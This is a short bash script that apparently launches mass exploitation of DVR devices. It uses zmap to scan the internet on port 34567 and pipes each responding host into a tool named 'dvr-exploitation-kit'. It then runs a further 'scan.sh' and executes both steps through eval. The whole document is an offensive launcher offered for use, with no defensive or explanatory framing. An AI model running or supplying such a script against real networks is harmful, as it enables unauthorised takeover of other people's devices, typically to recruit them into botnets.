#!/bin/bash

commands=(
    'ulimit -n 999999;ulimit -u999999; zmap -p 34567 -T4 -r0 | ./dvr-exploitation-kit -p 34567'
    'bash scan.sh'
)

for cmd in "${commands[@]}"; do
    echo "Running command: $cmd"
    eval "$cmd"
    echo "Command finished"
done
